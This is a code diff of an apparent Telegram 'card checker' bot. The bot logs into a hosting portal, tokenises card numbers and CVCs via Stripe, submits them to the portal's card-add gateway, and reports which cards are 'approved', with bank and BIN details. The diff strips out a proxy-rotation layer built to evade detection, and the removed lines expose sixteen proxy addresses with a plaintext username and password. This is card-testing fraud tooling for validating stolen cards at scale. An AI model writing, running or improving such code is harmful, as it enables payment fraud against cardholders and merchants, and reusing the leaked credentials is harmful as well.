@@ -37,28 +37,6 @@ MAX_RETRIES = 3
 REQUEST_TIMEOUT = 30
 RATE_LIMIT_DELAY = 1.5
 MAX_CARDS_PER_SESSION = 5000
-
-# ============= PROXY CONFIGURATION =============
-PROXY_LIST = [
-    "82.27.214.95:6437:bxnvwevk:utgavp02z833",
-    "82.25.216.4:6846:bxnvwevk:utgavp02z833",
-    "82.29.229.73:6428:bxnvwevk:utgavp02z833",
-    "82.27.214.211:6553:bxnvwevk:utgavp02z833",
-    "23.27.138.159:6260:bxnvwevk:utgavp02z833",
-    "82.21.224.16:6372:bxnvwevk:utgavp02z833",
-    "82.22.210.43:7885:bxnvwevk:utgavp02z833",
-    "82.21.224.151:6507:bxnvwevk:utgavp02z833",
-    "82.29.230.237:7078:bxnvwevk:utgavp02z833",
-    "82.29.230.104:6945:bxnvwevk:utgavp02z833",
-    "82.27.233.36:7377:bxnvwevk:utgavp02z833",
-    "66.63.180.17:5541:bxnvwevk:utgavp02z833",
-    "82.22.210.196:8038:bxnvwevk:utgavp02z833",
-    "82.22.220.143:5498:bxnvwevk:utgavp02z833",
-    "82.26.221.150:5491:bxnvwevk:utgavp02z833",
-    "82.29.229.209:6564:bxnvwevk:utgavp02z833"
-]
-
-CARDS_PER_PROXY = 50  # Change proxy every 50 cards
 # ============================================
 
 @dataclass
@@ -82,57 +60,6 @@ class CardResult:
     time_taken: float = 0.0
     response: str = ""
     gateway_response: str = ""
-
-class ProxyManager:
-    """Manages proxy rotation"""
-    def __init__(self, proxy_list: List[str], cards_per_proxy: int = 50):
-        self.proxy_list = proxy_list
-        self.cards_per_proxy = cards_per_proxy
-        self.current_proxy_index = 0
-        self.cards_checked_with_current = 0
-        self.lock = threading.Lock()
-    
-    def get_proxy_dict(self) -> Optional[Dict[str, str]]:
-        """Get current proxy in requests format"""
-        with self.lock:
-            if not self.proxy_list:
-                return None
-            
-            proxy_str = self.proxy_list[self.current_proxy_index]
-            parts = proxy_str.split(':')
-            
-            if len(parts) == 4:
-                host, port, username, password = parts
-                proxy_url = f"http://{username}:{password}@{host}:{port}"
-                return {
-                    'http': proxy_url,
-                    'https': proxy_url
-                }
-            return None
-    
-    def increment_card_count(self):
-        """Increment card counter and rotate proxy if needed"""
-        with self.lock:
-            self.cards_checked_with_current += 1
-            
-            if self.cards_checked_with_current >= self.cards_per_proxy:
-                self.rotate_proxy()
-    
-    def rotate_proxy(self):
-        """Rotate to next proxy"""
-        with self.lock:
-            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
-            self.cards_checked_with_current = 0
-            logger.info(f"Rotated to proxy index {self.current_proxy_index}")
-    
-    def get_current_proxy_info(self) -> str:
-        """Get current proxy info for display"""
-        with self.lock:
-            if not self.proxy_list:
-                return "No proxy"
-            proxy_str = self.proxy_list[self.current_proxy_index]
-            host = proxy_str.split(':')[0]
-            return f"{host} ({self.cards_checked_with_current}/{self.cards_per_proxy})"
 
 class RateLimiter:
     """Simple rate limiter"""
@@ -215,14 +142,13 @@ class InputValidator:
 class CardChecker:
     """Enhanced card checker with better error handling and retries"""
     
-    def __init__(self, proxy_manager: ProxyManager):
+    def __init__(self):
         self.session = requests.Session()
         self.session.timeout = REQUEST_TIMEOUT
         self.logged_in = False
         self.email = None
         self.rate_limiter = RateLimiter(RATE_LIMIT_DELAY)
         self.login_lock = threading.Lock()
-        self.proxy_manager = proxy_manager
         
         # Set session headers
         self.session.headers.update({
@@ -252,10 +178,7 @@ class CardChecker:
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     }
                     
-                    # Use proxy for BIN lookup
-                    proxies = self.proxy_manager.get_proxy_dict()
-                    
-                    response = requests.get(api_url, headers=headers, timeout=10, proxies=proxies)
+                    response = requests.get(api_url, headers=headers, timeout=10)
                     
                     if response.status_code == 200:
                         data = response.json()
@@ -340,15 +263,11 @@ class CardChecker:
                     'password': password,
                 }
 
-                # Use proxy for login
-                proxies = self.proxy_manager.get_proxy_dict()
-
                 response = self.session.post(
                     'https://portal.budgetvm.com/auth/login',
                     headers=login_headers,
                     data=login_data,
-                    timeout=30,
-                    proxies=proxies
+                    timeout=30
                 )
                 
                 # Check for session cookie
@@ -394,15 +313,11 @@ class CardChecker:
                 'gid': '120828',
             }
 
-            # Use proxy
-            proxies = self.proxy_manager.get_proxy_dict()
-
             response = self.session.post(
                 'https://portal.budgetvm.com/auth/googleAsk',
                 headers=google_ask_headers,
                 data=google_ask_data,
-                timeout=30,
-                proxies=proxies
+                timeout=30
             )
             
             if response.status_code == 200:
@@ -456,15 +371,11 @@ class CardChecker:
                 f'card[cvc]={cvc}'
             )
 
-            # Use proxy
-            proxies = self.proxy_manager.get_proxy_dict()
-
             response = requests.post(
                 'https://api.stripe.com/v1/tokens',
                 headers=stripe_headers,
                 data=stripe_data,
-                timeout=30,
-                proxies=proxies
+                timeout=30
             )
             
             if response.status_code == 200:
@@ -541,12 +452,7 @@ class CardChecker:
                 )
 
             # Test card with gateway
-            result = self._test_with_gateway(card_info, token_id, bin_info, start_time)
-            
-            # Increment proxy counter after successful check
-            self.proxy_manager.increment_card_count()
-            
-            return result
+            return self._test_with_gateway(card_info, token_id, bin_info, start_time)
             
         except Exception as e:
             logger.error(f"Card test error for {card_info}: {traceback.format_exc()}")
@@ -574,15 +480,11 @@ class CardChecker:
                 'stripeToken': token_id,
             }
 
-            # Use proxy
-            proxies = self.proxy_manager.get_proxy_dict()
-
             response = self.session.post(
                 'https://portal.budgetvm.com/MyGateway/Stripe/cardAdd',
                 headers=card_headers,
                 data=card_data,
-                timeout=30,
-                proxies=proxies
+                timeout=30
             )
             
             time_taken = round(time.time() - start_time, 2)
@@ -682,16 +584,11 @@ class SessionManager:
         self.threads: Dict[int, threading.Thread] = {}
         self.stop_flags: Dict[int, bool] = {}
         self.locks: Dict[int, threading.Lock] = {}
-        self.proxy_managers: Dict[int, ProxyManager] = {}
     
     def get_session(self, user_id: int) -> Dict:
         if user_id not in self.sessions:
-            # Create proxy manager for this user
-            if user_id not in self.proxy_managers:
-                self.proxy_managers[user_id] = ProxyManager(PROXY_LIST, CARDS_PER_PROXY)
-            
             self.sessions[user_id] = {
-                'checker': CardChecker(self.proxy_managers[user_id]),
+                'checker': CardChecker(),
                 'logged_in': False,
                 'email': None,
                 'dashboard_msg_id': None,
@@ -717,11 +614,6 @@ class SessionManager:
             self.locks[user_id] = threading.Lock()
         return self.locks[user_id]
     
-    def get_proxy_manager(self, user_id: int) -> ProxyManager:
-        if user_id not in self.proxy_managers:
-            self.proxy_managers[user_id] = ProxyManager(PROXY_LIST, CARDS_PER_PROXY)
-        return self.proxy_managers[user_id]
-    
     def cleanup_old_sessions(self, max_age: int = 3600):
         """Clean up old inactive sessions"""
         current_time = time.time()
@@ -746,7 +638,7 @@ class SessionManager:
             del self.threads[user_id]
         
         # Clean up data structures
-        for data_dict in [self.sessions, self.results, self.stop_flags, self.locks, self.proxy_managers]:
+        for data_dict in [self.sessions, self.results, self.stop_flags, self.locks]:
             data_dict.pop(user_id, None)
 
 # Initialize managers
@@ -772,20 +664,15 @@ class MessageFormatter:
             status_emoji = "⚠️"
             status_text = result.status
         
-        # Get proxy info
-        proxy_manager = session_manager.get_proxy_manager(user_id)
-        proxy_info = proxy_manager.get_current_proxy_info()
-        
         message = f"""
 ↯ [💳] 𝙲𝚊𝚛𝚍 ↯ {result.card}
 ↯ [{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
 [🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [{result.message}]
-↯ [🔟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
-[🦅] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
+↯ [📟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
+[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
 [{bin_info.country_emoji}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info.country} [{bin_info.country_emoji}]
-↯ [🤺] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Live Auth 🥷↯
+↯ [🤓] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Live Auth 🥷↯
 [🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.time_taken}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
-[🌐] 𝙿𝚛𝚘𝚡𝚢 ↯ {proxy_info}
 [❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [PRO]
 [🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME} - 🥷↯
 """
@@ -797,7 +684,6 @@ class MessageFormatter:
         """Format dashboard with enhanced statistics"""
         results = session_manager.get_results(user_id)
         session = session_manager.get_session(user_id)
-        proxy_manager = session_manager.get_proxy_manager(user_id)
         
         # Calculate progress
         progress = results['total']
@@ -834,11 +720,8 @@ class MessageFormatter:
 ├ 🚄 **Speed:** {cards_per_minute:.1f} cards/min
 └ 🔄 **Status:** {'🟢 Active' if user_id in session_manager.threads and session_manager.threads[user_id].is_alive() else '⚪ Idle'}
 
-🌐 **Proxy Info:**
-└ 🔗 **Current:** {proxy_manager.get_current_proxy_info()}
-
-🔧 **Session Info:**
-└ 📧 **Account:** {session.get('email', 'Not logged in')}
+📧 **Session Info:**
+└ 🔐 **Account:** {session.get('email', 'Not logged in')}
 """
         
         return dashboard.strip()
@@ -1296,7 +1179,7 @@ def handle_action_callbacks(call):
                 return
             
             bot.answer_callback_query(call.id)
-            instruction_text = f"""
+            instruction_text = """
 
 **💡 Methods:**
 1️⃣ **Text Message:** Paste cards directly
@@ -1315,7 +1198,7 @@ def handle_action_callbacks(call):
 • Export approved cards
 
 **🚀 Ready to check your cards!**
-"""
+""".format(MAX_CARDS_PER_SESSION=MAX_CARDS_PER_SESSION)
             
             bot.send_message(user_id, instruction_text, parse_mode='Markdown')
             
@@ -1433,7 +1316,7 @@ def process_password_input(message):
 
 📧 **Email:** `{email}`
 🕐 **Time:** {datetime.now().strftime('%H:%M:%S')}
-📍 **Status:** Authenticated
+🔐 **Status:** Authenticated
 
 You can now check cards! 🚀
 """, user_id, login_msg.message_id, parse_mode='Markdown', 
